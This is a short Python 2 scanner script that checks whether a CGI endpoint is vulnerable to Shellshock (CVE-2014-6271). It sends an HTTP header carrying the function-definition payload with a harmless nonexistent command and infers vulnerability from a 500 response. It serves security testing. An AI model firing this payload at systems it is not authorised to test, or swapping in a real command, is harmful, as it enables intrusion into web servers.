#!/usr/bin/python
#CVE-2014-6271 500 Error test
#

import httplib,urllib,sys
from urlparse import urlparse

if (len(sys.argv)<2):
	print "Usage: %s <url>" % sys.argv[0]
	print "Example: %s http://localhost/cgi-bin/test.cgi" % sys.argv[0]
	exit(0)

url = sys.argv[1]

if url[:4] != "http":
	url = "http://" + url

parse_object = urlparse(url)
domain = parse_object.netloc
cgi = parse_object.path
proto = parse_object.scheme

if proto == "https":
	conntest = httplib.HTTPSConnection(domain)
	conn = httplib.HTTPSConnection(domain)
elif proto == "http":
	conntest = httplib.HTTPConnection(domain)
	conn = httplib.HTTPConnection(domain)
else:
	exit(0)

headers = {"Content-type": "application/x-www-form-urlencoded"}
conntest.request("GET",cgi,headers=headers)
res = conntest.getresponse()

if res.status == 500:
	print "NOT RELIABLE"
	exit(0)
elif res.status == 404:
        print "NOT FOUND"
	exit(0)

cmd="() { ignored;};/bin/not-exist-cmd"
headers = {"Content-type": "application/x-www-form-urlencoded", "test":cmd }
conn.request("GET",cgi,headers=headers)
res = conn.getresponse()

if res.status == 500:
	print "VULNERABLE"
elif res.status == 404:
	print "NOT FOUND"
else:
	if cgi == "":
		print "NO CGI"
	else:
		print "NOT VULNERABLE"

